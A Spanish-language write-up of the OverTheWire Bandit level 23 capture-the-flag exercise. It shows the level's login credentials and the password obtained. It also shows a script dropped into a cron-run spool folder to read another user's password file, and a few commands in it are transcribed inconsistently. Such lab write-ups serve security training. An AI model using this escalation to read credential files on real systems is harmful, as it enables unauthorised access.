# Level 23 - Level 24
## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
## Datos de acceso al nivel
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```
## Solución
```bash
bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
bandit23@bandit:/$ mkdir /tmp/Eror4756
bandit23@bandit:/$ cd /tmp/Eror4756
bandit23@bandit:/tmp/Eror4756$ echo "cat /etc/bandit_pass/bandit24 > /tmp/Eror4756/password"
cat /etc/bandir_pass/bandit24 > /tmp/Eror4756/password
bandit23@bandit:/tmp/Eror4756$ ls
bandit23@bandit:/tmp/Eror4756$ echo "cat /etc/bandir_pass/bandit24 > /tmp/Eror4756/password" > script.sh
bandit23@bandit:/tmp/Eror4756$ ls
script.sh
bandit23@bandit:/tmp/Eror4756$ chmod 777 script.sh
bandit23@bandit:/tmp/Eror4756$ touch password
bandit23@bandit:/tmp/Eror4756$ chmod 666 password
bandit23@bandit:/tmp/Eror4756$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/Eror4756$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```
## Notas adicionales
mktemp genera una carpeta temporal con un nombre genérico
## Referencias